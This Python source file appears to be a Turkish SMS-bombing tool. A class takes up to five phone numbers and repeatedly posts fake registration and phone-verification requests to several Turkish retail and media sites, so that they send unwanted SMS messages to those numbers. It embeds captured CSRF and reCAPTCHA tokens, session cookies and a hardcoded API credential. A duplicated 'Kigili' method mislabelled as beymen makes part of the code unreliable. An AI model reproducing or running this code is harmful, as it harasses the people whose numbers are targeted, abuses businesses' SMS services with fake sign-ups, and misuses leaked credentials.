import requests

from random import choice

from string import ascii_lowercase

from bs4 import BeautifulSoup

from colorama import Fore, Style

from time import sleep



class SendSms():

    adet = 0

    toplam_sms = 1

    

   

    def __init__(self, phone, phone2, phone3, phone4, phone5, mail):

        self.phone = str(phone)

        self.phone2 = str(phone2)

        self.phone3 = str(phone3)

        self.phone4 = str(phone4)

        self.phone5 = str(phone5)

        if len(mail) != 0:

            self.mail = mail

        else:

            self.mail = ''.join(choice(ascii_lowercase) for i in range(19))+"@gmail.com"

            

    

    





    # dsmartgo.com.tr

    def Dsmartgo(self):

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                    dsmartgo = requests.post("https://www.dsmartgo.com.tr/web/account/checkphonenumber", data={

        	        "__RequestVerificationToken": "bYFLKS9DehCBAb7l7KaI2WoTdtAJZya-AWsDTmHCl9FnEaUZiF2F1l3XkwppUyT0I3bXMUdUAruBUcqR8jVuLVsxPC41",

        	        "IsSubscriber": "true",

        	        "__reCAPTCHAVerificationToken": "03AGdBq26zV1jYt3RM1kdow0gpFcD7veljQAdV-0QoKLQIWi3voe27TlOwjbktguXtHgngHy13jsTzudfoNuLowIdqG1RcX4_XP5VoXy4un214kmTqChIDJPMKWvkUmLfXvWvXNTdajueI0T4zkdX2VGLz1Vn-uQxRRWxXjY81GZQlLUqu3oOSDYLBN2JH5DPh79Ms4BAxrTFC-ywWIWN1VVN5R2S6R6Ew7iyhDN_QQ1Ow5XcKuT7ycZbMrC_GUML5sKeDgoOtvm4pZ75LKX8ZArd9EPM783h0AXXVMedFGxa0V7a6_FocQ_7PRHeyOnku-HyoMgGZgB7cSIu6tPNddtYGLbOMGhR-2EyCtW4qKq1a9yceT-v7nequ9S0Cr-gYhb7DkjUyk56oUaZD6Za2NzqxIHPzfWC2M9x8WWeiWFqGSCHhjtL29UzGV8HH38X85BEpJKUVc_1U",

        	        "Mobile": numara,

                }, cookies={

        		    "__RequestVerificationToken": "zavKdfCRqVPRUTX-52rcfG8yfGNVfs10gNOb5RIn16upRTctGH4nBp8ReSMxzZUN4cJQTcvY0b4uzP6AL0inDD_cFyA1",

        		    "_ga": "GA1.3.1016548678.1638216163",

        		    "_gat": "1",

        		    "_gat_gtag_UA_18913632_14": "1",

        		    "_gid": "GA1.3.1214889554.1638216163",

        		    "ai_session": "lsdsMzMdX841eBwaKMxd8e|1638216163472|1638216163472",

        		    "ai_user": "U+ClfGV5d2ZK1W1o19UNDn|2021-11-29T20:02:43.148Z"

        	    })

            try:

                BeautifulSoup(dsmartgo.text, "html.parser").find("div", {"class": "info-text"}).text.strip()

                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> dsmartgo.com.tr")

            except AttributeError:

                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> dsmartgo.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                self.adet += 1

                self.toplam_sms += 1

            uygulanan_nolar += 1

            if uygulanan_nolar == bos_olmayan:

                break

            else:

                continue

        



    # kigili.com

    def Kigili(self): 

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    kigili = requests.post("https://www.kigili.com/users/registration/", data={

                    "first_name": "Memati",

                    "last_name": "Bas",

                    "email": self.mail,

                    "phone": f"0{numara}",

                    "password": "31ABC..abc31",

                    "confirm": "true",

                    "kvkk": "true",

                    "next": ""

                })

                    if kigili.status_code == 202:

                         print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> kigili.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                         self.adet += 1

                         self.toplam_sms += 1

                    else:

                        raise 

                except :

                     print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> kigili.com "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

                else:

                    continue

        
    # beymen

    def Kigili(self): 

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    kigili = requests.post("https://www.kigili.com/users/registration/", data={

                    "first_name": "Memati",

                    "last_name": "Bas",

                    "email": self.mail,

                    "phone": f"0{numara}",

                    "password": "31ABC..abc31",

                    "confirm": "true",

                    "kvkk": "true",

                    "next": ""

                })

                    if kigili.status_code == 202:

                         print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> beymen "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                         self.adet += 1

                         self.toplam_sms += 1

                    else:

                        raise 

                except :

                     print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> beymen "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

                else:

                    continue





            

            

    #gratis.com

    def Gratis(self):

            

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]

        bos_olmayan = len([x for x in liste if x != "bos"])

        uygulanan_nolar = 0

        for numara in liste:

            if numara != "bos":

                try:

                    token = requests.get("https://ivt.mobildev.com:443/auth", headers={"Accept": "*/*", "Accept-Encoding": "gzip, deflate", "User-Agent": "Gratis/2.2.5 (com.pharos.Gratis; build:1447; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Authorization": "Basic NDkxNTkwNjU2OTpnMDg1M2YzY3Z0cjJkYXowYTFodXE3bnNveGZ6cTA=", "Connection": "close"}).json()["access_token"]

                    url = "https://ivt.mobildev.com:443/data/0e80tyg8"

                    headers = {"Accept": "*/*", "Content-Type": "application/json", "Authorization": f"Bearer {token}", "Accept-Encoding": "gzip, deflate", "User-Agent": "Gratis/2.2.5 (com.pharos.Gratis; build:1447; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Connection": "close"}

                    json={"accountType": 0, "coordinate": {"lat": 0, "lon": 0}, "customId": "", "email": self.mail, "etk": {"call": 2, "email": 2, "emailFrequency": 2, "emailFrequencyType": 1, "msisdn": 1, "msisdnFrequency": 2, "msisdnFrequencyType": 1, "share": 1}, "extended": {"loyalty": 11}, "firstName": "Memati", "kvkk": {"international": 1, "process": 1, "share": 1}, "language": "tr", "lastName": "Bas", "msisdn": numara, "note": "\xc4\xb0zin S\xc3\xbcreci Ba\xc5\x9flatma", "permSource": 3}

                    r = requests.post(url, headers=headers, json=json)

                    if (r.status_code) == 200:

                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> ivt.mobildev.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))

                        self.adet += 1

                        self.toplam_sms += 1

                    else:

                        raise

                except:

                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> ivt.mobildev.com "+numara)

                uygulanan_nolar += 1

                if uygulanan_nolar == bos_olmayan:

                    break

            else:

                continue

